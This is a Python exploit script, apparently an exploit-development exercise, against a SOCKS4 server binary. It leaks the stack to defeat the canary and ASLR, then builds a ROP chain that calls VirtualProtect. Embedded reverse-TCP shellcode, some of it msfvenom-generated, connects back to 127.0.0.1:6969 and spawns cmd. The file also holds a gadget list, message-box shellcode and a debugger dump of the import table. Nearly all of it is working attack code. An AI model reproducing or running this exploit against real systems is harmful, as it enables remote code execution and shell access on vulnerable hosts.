import socket
import struct



def do_shellcode(img_base, buff_addr):
    shellcode = b""

    # int WSAStartup(
    #         WORD      wVersionRequired,   rcx
    #   [out] LPWSADATA lpWSAData           rdx
    # );

    # call WSASartup
    shellcode += b"\x48\xBA"
    shellcode += struct.pack('<Q', buff_addr)       # mov rdx, 0x7ff61bdd5000
    shellcode += b"\x48\xB9\x02\x02\x00\x00\x00\x00\x00\x00"    # mov rcx, 0x202
    shellcode += b"\x48\xBF"    # mov rax, WS2_32!WSAStartup
    shellcode += struct.pack('<Q', img_base + 0x30f8)
    shellcode += b"\x48\x8B\x07"
    shellcode += b"\x48\x81\xEC\x08\x10\x00\x00"
    shellcode += b"\xFF\xd0"                                    # call rax

    # msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=6969 -f py
    shellcode += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
    shellcode += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
    shellcode += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
    shellcode += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
    shellcode += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    shellcode += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
    shellcode += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    shellcode += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
    shellcode += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
    shellcode += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    shellcode += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
    shellcode += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
    shellcode += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
    shellcode += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    shellcode += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    shellcode += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    shellcode += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49"
    shellcode += b"\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
    shellcode += b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
    shellcode += b"\x49\xbc\x02\x00\x1b\x39\x7f\x00\x00\x01\x41\x54"
    shellcode += b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
    shellcode += b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
    shellcode += b"\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9"
    shellcode += b"\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0"
    shellcode += b"\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
    shellcode += b"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9"
    shellcode += b"\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40"
    shellcode += b"\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
    shellcode += b"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d"
    shellcode += b"\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
    shellcode += b"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68"
    shellcode += b"\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49"
    shellcode += b"\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89"
    shellcode += b"\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2"
    shellcode += b"\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
    shellcode += b"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d"
    shellcode += b"\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb"
    shellcode += b"\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41"
    shellcode += b"\x89\xda\xff\xd5"

    return shellcode

def shellcode_msgbox():
    return b'H\x89\\$\x10H\x89|$\x18UH\x8b\xecH\x83\xec`eH\x8b\x04%`\x00\x00\x003\xffA\xb8\xff\xff\xff\xffH\x8bH\x18H\x8bA H\x8b\x08H\x8b\x01\x8b\xcfL\x8bH IcA<F\x8b\x9c\x08\x88\x00\x00\x00M\x03\xd9A\x8bS E\x8bS\x18I\x03\xd1E\x85\xd2t]H\x89t$pH\xbbGetProcAH\xbeAddress\x00\x90\x8b\x02J9\x1c\x08u\tJ9t\x08\x07D\x0fD\xc1H\x83\xc2\x04\xff\xc1A;\xcar\xe4H\x8bt$pE\x85\xc0~\x1dA\x8bK$I\x03\xc9Ic\xd0D\x0f\xb7\x04QA\x8bK\x1cI\x03\xc9B\x8b<\x81I\x03\xf9H\x8dU\xf0\xc7E\xf0LoadI\x8b\xc9\xc7E\xf4Libr\xc7E\xf8aryA\xc6E\xfc\x00\xff\xd7H\x8b\xd8\xc7E\xc0UserH\x8dM\xc0\xc7E\xc432.df\xc7E\xc8ll\xc6E\xca\x00\xff\xd3H\x8dU\xe0\xc7E\xe0MessH\x8b\xc8\xc7E\xe4ageB\xc7E\xe8oxA\x00\xff\xd7E3\xc9\xc7E\xd0Get E3\xc0\xc7E\xd4HackH\x8dU\xd0f\xc7E\xd8ed3\xc9\xc6E\xda\x00\xff\xd0H\x8b\xbc$\x80\x00\x00\x00H\x8b\xc3H\x8b\\$xH\x83\xc4`]\xc3'
def shellcode_myreversetcp():
    return b'UVWATAUAVAWH\x8dl$\xa0H\x81\xec`\x01\x00\x00eH\x8b\x04%`\x00\x00\x003\xd2H\x8bH\x18H\x8bA H\x8b\x08H\x8b\x01H\x8bx HcG<D\x8b\x8c8\x88\x00\x00\x00\xb8\xff\xff\xff\xffL\x03\xcfE\x8bA E\x8bQ\x18L\x03\xc7E\x85\xd2tSH\xbbAddress\x00I\xbbGetProcAA\x8b\x08L9\x1c9u\x08H9\\9\x07\x0fD\xc2I\x83\xc0\x04\xff\xc2A;\xd2r\xe4\x85\xc0~\x1fA\x8bI$H\x03\xcfHc\xd0D\x0f\xb7\x04QA\x8bI\x1cH\x03\xcfF\x8b$\x81L\x03\xe7\xeb\x03E3\xe4H\x8dU\xa0L\x89\xa5\xb0\x00\x00\x00H\x8b\xcf\xc7E\xa0Load\xc7E\xa4Libr\xc7E\xa8aryA\xc6E\xac\x00A\xff\xd4L\x8b\xe8\xc7D$pWs2_H\x8dL$p\xc7D$t32.df\xc7D$xll\xc6D$z\x00A\xff\xd5H\x8dU\x80\xc7E\x80WSASH\x8b\xc8\xc7E\x84ockeH\x8b\xd8f\xc7E\x88tA\xc6E\x8a\x00A\xff\xd4H\x8dT$P\xc7D$PinetH\x8b\xcb\xc7D$T_addL\x8b\xf0f\xc7D$Xr\x00A\xff\xd4H\x8d\x95\xa8\x00\x00\x00\xc7\x85\xa8\x00\x00\x00connH\x8b\xcb\xc7\x85\xac\x00\x00\x00ect\x00L\x8b\xf8A\xff\xd4H\x8dU\xb0\xc7E\xb0CreaH\x8b\xcf\xc7E\xb4tePrH\x8b\xf0\xc7E\xb8ocesf\xc7E\xbcsA\xc6E\xbe\x00A\xff\xd4H\x8dU\x90\xc7E\x90ExitH\x8b\xcf\xc7E\x94ThreL\x8b\xe0f\xc7E\x98ad\xc6E\x9a\x00\xff\x95\xb0\x00\x00\x00H\x8b\xf8E3\xc93\xc0\x89D$(H\x89E\xc8\x89D$ \x8dP\x01\x8dH\x02D\x8d@\x06A\xff\xd6H\x8dL$`\xc7E\xc0\x02\x00\x1b9H\x8b\xd8\xc7D$`127.\xc7D$d0.0.f\xc7D$h1\x00A\xff\xd7A\xb8\x10\x00\x00\x00\x89E\xc4H\x8dU\xc0H\x8b\xcb\xff\xd6\x0fW\xc0\x0f\x11E\xd0\x0f\x11E\xe0\x0f\x11E\xf0\x0f\x11E\x00\x0f\x11E\x10\x0f\x11E H\x8dE@\xc7E\xd0h\x00\x00\x00H\x89D$HH\x8d\x95\xa0\x00\x00\x00H\x8dE\xd0\xc7E\x0c\x00\x01\x00\x00H\x89D$@E3\xc93\xc0H\x89] H\x89D$8E3\xc0H\x89D$03\xc9\xc7D$(\x00\x00\x00\x08\xc7D$ \x01\x00\x00\x00H\x89](H\x89]0\xc7\x85\xa0\x00\x00\x00cmd\x00A\xff\xd43\xc9\xff\xd7H\x8b\x9c$\xb8\x01\x00\x00I\x8b\xc5H\x81\xc4`\x01\x00\x00A_A^A]A\\_^]\xc3'

"""
0x2599 : pop rax ; ret
0x2591 : pop rcx ; ret
0x2594 : pop rdx ; ret
0x1052 : pop rbx ; ret
0x175b : pop rsi ; ret
0x1140 : pop rdi ; ret
0x24af : pop rbp ; ret
0x2598 : pop r8 ; ret
0x259d : pop r9 ; ret
0x4ef7 : pop r13 ; ret
0xc3bb : pop r12 ; ret
0x1cb9 : pop r14 ; ret
0xc2a3 : pop r15 ; ret
0x4ef4 : pop rdi ; pop r14 ; pop r13 ; ret
0x11b37 : pop rdi ; pop rsi ; pop rbp ; pop rbx ; ret

0x46b0 : mov qword ptr [rax], rcx ; ret

0x12ecb : call qword ptr [rax]
0x16779 : jmp qword ptr [rbx]
0x3865 : jmp rbx

0x2cb7 : add rsp, 0x18 ; ret
0x1221 : add rsp, 0x28 ; ret
0x2975 : add rsp, 0x38 ; ret
0x359c : add rsp, 0x48 ; ret
0x1383e : add rsp, 0x58 ; ret
0x2fc2 : add rsp, 0x5c0 ; pop rbp ; ret

0x2f90 : xchg eax, esp ; ret

0x25c8 : xchg r10, rcx ; ret
0x25b7 : add esp, ecx ; ret

0x259a : ret;
"""
# 00007ff6`55a70000
# 00007ff6`55a88198  00007ffd`1bfed440 KERNEL32!GetModuleHandleWStub 0x18198
# 00007ff6`55a88200  00007ffd`1bfeb1d0 KERNEL32!GetProcAddressStub
# 00007ff6`55a88100  00007ffd`1bfebf80 KERNEL32!VirtualProtectStub

class Gadgets:
    # Imported Functions.
    GetModuleHandleW = 0x18198
    GetProcAddress = 0x18200
    VirtualProtect = 0x18100

    # Gadgets in Socks4Server_3.exe.
    XchgR10RcxRet = 0x25c8
    PopRaxRet = 0x2599
    PopRcxRet = 0x2591
    PopRdxRet = 0x2594
    PopRbxRet = 0x1052
    PopRsiRet = 0x175b
    PopRdiRet = 0x1140
    PopRbpRet = 0x24af
    PopR8Ret = 0x2598
    PopR9Ret = 0x259d
    ThreePops = 0x4ef4
    FourPops = 0x11b37

    CallQwordRax = 0x12ecb
    JmpQWordRbx = 0x16779
    JmpRbx = 0x3865

    MovQWordRaxRcx = 0x46b0

    AddEspEcxRet = 0x25b7
    AddRsp28 = 0x1221
    AddRsp5c0PopRbpRet = 0x2fc2

    Ret = 0x259a

   
    def __init__(self, img_base):
        Gadgets.GetModuleHandleW += img_base
        Gadgets.GetProcAddress += img_base
        Gadgets.VirtualProtect += img_base
        Gadgets.XchgR10RcxRet += img_base
        Gadgets.PopRaxRet += img_base
        Gadgets.PopRcxRet += img_base
        Gadgets.PopRdxRet += img_base
        Gadgets.PopRbxRet += img_base
        Gadgets.PopRsiRet += img_base
        Gadgets.PopRdiRet += img_base
        Gadgets.PopRbpRet += img_base
        Gadgets.PopR8Ret += img_base
        Gadgets.PopR9Ret += img_base
        Gadgets.ThreePops += img_base
        Gadgets.FourPops += img_base
        Gadgets.CallQwordRax += img_base
        Gadgets.JmpQWordRbx += img_base
        Gadgets.JmpRbx += img_base
        Gadgets.MovQWordRaxRcx += img_base
        Gadgets.AddEspEcxRet += img_base
        Gadgets.AddRsp28 += img_base
        Gadgets.AddRsp5c0PopRbpRet += img_base
        Gadgets.Ret += img_base


def pack(val):
    return struct.pack('<Q', val)

def intpack(val):
    return struct.pack('<i', val)



def get_payload(ret, buff_addr, img_base):

    gadgets = Gadgets(img_base)
    # kernelbase = b'K\x00E\x00R\x00N\x00E\x00L\x00B\x00A\x00S\x00E\x00.\x00D\x00L\x00L\x00\x00\x00'
    # virtualprotect = b'VirtualProtect\x00\x00'
    # shellcode = shellcode_msgbox()
    shellcode = shellcode_myreversetcp()

    payload = (
        b'' +
        # kernelbase +
        # virtualprotect +
        pack(gadgets.PopR9Ret) +
        pack(buff_addr)+

        pack(gadgets.PopR8Ret) +
        pack(0x40) +

        pack(gadgets.PopRdxRet) +
        pack(0xa00) + 

        pack(gadgets.PopRcxRet) +
        pack(buff_addr) +
        pack(gadgets.PopRbxRet) +
        pack(gadgets.VirtualProtect) +
        pack(gadgets.JmpQWordRbx) +
        # pack(buff_addr + 328 + 24 + 8) + # rbx
        pack(gadgets.ThreePops)+
        b"D" * (24) + 
        # pack(gadgets.PopR8Ret) +
        # pack(gadgets.PopR8Ret) +
        # pack(gadgets.PopR8Ret) +
        # pack(gadgets.PopR8Ret) +
        pack(buff_addr + 328 + 24 + 8 + 8) + # rbx
        pack(ret + 24) +

        shellcode +
        b"ABABABAB"
    )
    print(hex(buff_addr + 328 + 24))
    print(hex(ret))

    return payload



def main():
    sock = socket.socket()
    sock.connect(("127.0.0.1" , 1080))
    buf = b""
    buf += b'\x00'
    buf += b'\xd3'
    buf += struct.pack("<l", 0x1000)
    buf += b'\x00'
    buf += b'\x00'
    sock.send(buf)

    stack = sock.recv(0x1000)
    sock.send(b"B" * 8)

    buffer = stack[448:448+8]
    buffer = int.from_bytes(buffer, 'little') - 0x2120
    # print(f"Buff: {hex(buffer)}")

    canary = stack[376:376+8]

    ret = stack[432:432+8]
    ret = ret[::-1]
    ret = int.from_bytes(ret, 'big')
    base = ret - 0x1d73
    # print(f"Ret: {hex(ret)}")
    # print(f"Base: {hex(base)}")

    buf = b"A" * 272
    buf += canary
    buf += b"A" * 48
    # buf += struct.pack("<Q", 0xdeadbeef)
    # buf += struct.pack("<Q", base + 0x1d73)
    payload = get_payload(ret, buffer, base)
    print(f"payload: {len(payload)}")
    buf += payload
    print(f"Buf: {len(buf)}")
    # print(buf)

    sock.send(buf)
    input("yeet")
if __name__ == "__main__":
    main()


'''
00007ff6`55a88000  00007ffd`1bff56a0 KERNEL32!SetConsoleCtrlHandler
00007ff6`55a88008  00007ffd`1bff4d90 KERNEL32!SetEvent
00007ff6`55a88010  00007ffd`1bfe5880 KERNEL32!HeapFreeStub
00007ff6`55a88018  00007ffd`1bfed7a0 KERNEL32!GetStdHandleStub
00007ff6`55a88020  00007ffd`1c0f3640 ntdll!RtlReAllocateHeap
00007ff6`55a88028  00007ffd`1c0fa9a0 ntdll!RtlAllocateHeap
00007ff6`55a88030  00007ffd`1bfe5ec0 KERNEL32!GetProcessHeapStub
00007ff6`55a88038  00007ffd`1bff56d0 KERNEL32!WriteConsoleW
00007ff6`55a88040  00007ffd`1bff4e70 KERNEL32!CreateFileW
00007ff6`55a88048  00007ffd`1c0f4160 ntdll!RtlSizeHeap
00007ff6`55a88050  00007ffd`1bff5290 KERNEL32!SetFilePointerEx
00007ff6`55a88058  00007ffd`1bff50a0 KERNEL32!GetFileSizeEx
00007ff6`55a88060  00007ffd`1bff5600 KERNEL32!GetConsoleMode
00007ff6`55a88068  00007ffd`1bff5610 KERNEL32!GetConsoleOutputCP
00007ff6`55a88070  00007ffd`1bff4fd0 KERNEL32!FlushFileBuffers
00007ff6`55a88078  00007ffd`1bfee640 KERNEL32!GetStringTypeWStub
00007ff6`55a88080  00007ffd`1bff0520 KERNEL32!SetStdHandleStub
00007ff6`55a88088  00007ffd`1bff0cd0 KERNEL32!SetEnvironmentVariableWStub
00007ff6`55a88090  00007ffd`1bfef9c0 KERNEL32!FreeEnvironmentStringsWStub
00007ff6`55a88098  00007ffd`1bfef9a0 KERNEL32!GetEnvironmentStringsWStub
00007ff6`55a880a0  00007ffd`1bfe5e40 KERNEL32!WideCharToMultiByteStub
00007ff6`55a880a8  00007ffd`1bfe5b20 KERNEL32!MultiByteToWideCharStub
00007ff6`55a880b0  00007ffd`1bfee5f0 KERNEL32!GetCPInfoStub
00007ff6`55a880b8  00007ffd`1bff15d0 KERNEL32!GetOEMCPStub
00007ff6`55a880c0  00007ffd`1bfee370 KERNEL32!GetACPStub
00007ff6`55a880c8  00007ffd`1bfeff80 KERNEL32!IsValidCodePageStub
00007ff6`55a880d0  00007ffd`1bff4fa0 KERNEL32!FindNextFileW
00007ff6`55a880d8  00007ffd`1bff4f30 KERNEL32!FindFirstFileExW
00007ff6`55a880e0  00007ffd`1bff4de0 KERNEL32!WaitForSingleObject
00007ff6`55a880e8  00007ffd`1bff4bf0 KERNEL32!CloseHandle
00007ff6`55a880f0  00007ffd`1bfeb8b0 KERNEL32!CreateThreadStub
00007ff6`55a880f8  00007ffd`1bff4c40 KERNEL32!CreateEventA
00007ff6`55a88100  00007ffd`1bfebf80 KERNEL32!VirtualProtectStub
00007ff6`55a88108  00007ffd`1bfeb0b0 KERNEL32!SleepStub
00007ff6`55a88110  00007ffd`1bff12a0 KERNEL32!GetModuleHandleExAStub
00007ff6`55a88118  00007ffd`1c00ba30 KERNEL32!TerminateThreadStub
00007ff6`55a88120  00007ffd`1bff49d0 KERNEL32!RtlCaptureContext
00007ff6`55a88128  00007ffd`1bfed600 KERNEL32!RtlLookupFunctionEntryStub
00007ff6`55a88130  00007ffd`1bfd1010 KERNEL32!RtlVirtualUnwindStub
00007ff6`55a88138  00007ffd`1c00ba90 KERNEL32!UnhandledExceptionFilterStub
00007ff6`55a88140  00007ffd`1bff0110 KERNEL32!SetUnhandledExceptionFilterStub
00007ff6`55a88148  00007ffd`1bff4b90 KERNEL32!GetCurrentProcess
00007ff6`55a88150  00007ffd`1bff0a70 KERNEL32!TerminateProcessStub
00007ff6`55a88158  00007ffd`1bfede50 KERNEL32!IsProcessorFeaturePresentStub
00007ff6`55a88160  00007ffd`1bfe5f20 KERNEL32!QueryPerformanceCounterStub
00007ff6`55a88168  00007ffd`1bff4ba0 KERNEL32!GetCurrentProcessId
00007ff6`55a88170  00007ffd`1bfe5860 KERNEL32!GetCurrentThreadId
00007ff6`55a88178  00007ffd`1bfe7e90 KERNEL32!GetSystemTimeAsFileTimeStub
00007ff6`55a88180  00007ffd`1c13eb70 ntdll!RtlInitializeSListHead
00007ff6`55a88188  00007ffd`1bff04c0 KERNEL32!IsDebuggerPresentStub
00007ff6`55a88190  00007ffd`1bfedb40 KERNEL32!GetStartupInfoWStub
00007ff6`55a88198  00007ffd`1bfed440 KERNEL32!GetModuleHandleWStub
00007ff6`55a881a0  00007ffd`1bfefd00 KERNEL32!RtlUnwindExStub
00007ff6`55a881a8  00007ffd`1bfe5f00 KERNEL32!GetLastErrorStub
00007ff6`55a881b0  00007ffd`1bfe5fc0 KERNEL32!SetLastErrorStub
00007ff6`55a881b8  00007ffd`1c0ffaa0 ntdll!RtlEnterCriticalSection
00007ff6`55a881c0  00007ffd`1c0ff230 ntdll!RtlLeaveCriticalSection
00007ff6`55a881c8  00007ffd`1c0e0fc0 ntdll!RtlDeleteCriticalSection
00007ff6`55a881d0  00007ffd`1bff4cf0 KERNEL32!InitializeCriticalSectionAndSpinCount
00007ff6`55a881d8  00007ffd`1bfecb40 KERNEL32!TlsAllocStub
00007ff6`55a881e0  00007ffd`1bfe5850 KERNEL32!TlsGetValueStub
00007ff6`55a881e8  00007ffd`1bfe5ea0 KERNEL32!TlsSetValueStub
00007ff6`55a881f0  00007ffd`1bfed690 KERNEL32!TlsFreeStub
00007ff6`55a881f8  00007ffd`1bfecae0 KERNEL32!FreeLibraryStub
00007ff6`55a88200  00007ffd`1bfeb1d0 KERNEL32!GetProcAddressStub
00007ff6`55a88208  00007ffd`1bfeb0d0 KERNEL32!LoadLibraryExWStub
00007ff6`55a88210  00007ffd`1c141f10 ntdll!RtlEncodePointer
00007ff6`55a88218  00007ffd`1bfeffc0 KERNEL32!RaiseExceptionStub
00007ff6`55a88220  00007ffd`1bfed6d0 KERNEL32!RtlPcToFileHeaderStub
00007ff6`55a88228  00007ffd`1bff52e0 KERNEL32!WriteFile
00007ff6`55a88230  00007ffd`1bfee230 KERNEL32!GetModuleFileNameWStub
00007ff6`55a88238  00007ffd`1bfee3b0 KERNEL32!ExitProcessImplementation
00007ff6`55a88240  00007ffd`1bfef940 KERNEL32!GetModuleHandleExWStub
00007ff6`55a88248  00007ffd`1bff0150 KERNEL32!GetCommandLineAStub
00007ff6`55a88250  00007ffd`1bfef6d0 KERNEL32!GetCommandLineWStub
00007ff6`55a88258  00007ffd`1bff04e0 KERNEL32!FlsAllocStub
00007ff6`55a88260  00007ffd`1bfe87f0 KERNEL32!FlsGetValueStub
00007ff6`55a88268  00007ffd`1bfec5e0 KERNEL32!FlsSetValueStub
00007ff6`55a88270  00007ffd`1bff0e20 KERNEL32!FlsFreeStub
00007ff6`55a88278  00007ffd`1bfec9b0 KERNEL32!CompareStringWStub
00007ff6`55a88280  00007ffd`1bfe87b0 KERNEL32!LCMapStringWStub
00007ff6`55a88288  00007ffd`1bff50c0 KERNEL32!GetFileType
00007ff6`55a88290  00007ffd`1bff4ed0 KERNEL32!FindClose
00007ff6`55a88298  00000000`00000000
00007ff6`55a882a0  00007ffd`1b612320 WS2_32!send
00007ff6`55a882a8  00007ffd`1b621a50 WS2_32!connect
00007ff6`55a882b0  00007ffd`1b621d90 WS2_32!recv
00007ff6`55a882b8  00007ffd`1b6218b0 WS2_32!WSAEnumNetworkEvents
00007ff6`55a882c0  00007ffd`1b622730 WS2_32!WSAGetLastError
00007ff6`55a882c8  00007ffd`1b620410 WS2_32!WSACleanup
00007ff6`55a882d0  00007ffd`1b6209c0 WS2_32!bind
00007ff6`55a882d8  00007ffd`1b622d20 WS2_32!WSAStringToAddressA
00007ff6`55a882e0  00007ffd`1b615000 WS2_32!closesocket
00007ff6`55a882e8  00007ffd`1b616e40 WS2_32!WSAAddressToStringA
00007ff6`55a882f0  00007ffd`1b622f00 WS2_32!WSACloseEvent
00007ff6`55a882f8  00007ffd`1b623260 WS2_32!WSACreateEvent
00007ff6`55a88300  00007ffd`1b621380 WS2_32!WSAAccept
00007ff6`55a88308  00007ffd`1b61eb10 WS2_32!WSAStartup
00007ff6`55a88310  00007ffd`1b631630 WS2_32!WSAHtons
00007ff6`55a88318  00007ffd`1b621980 WS2_32!WSAEventSelect
00007ff6`55a88320  00007ffd`1b622500 WS2_32!WSAResetEvent
00007ff6`55a88328  00007ffd`1b623630 WS2_32!WSAWaitForMultipleEvents
00007ff6`55a88330  00007ffd`1b624010 WS2_32!WSASocketA
00007ff6`55a88338  00007ffd`1b6212a0 WS2_32!listen

'''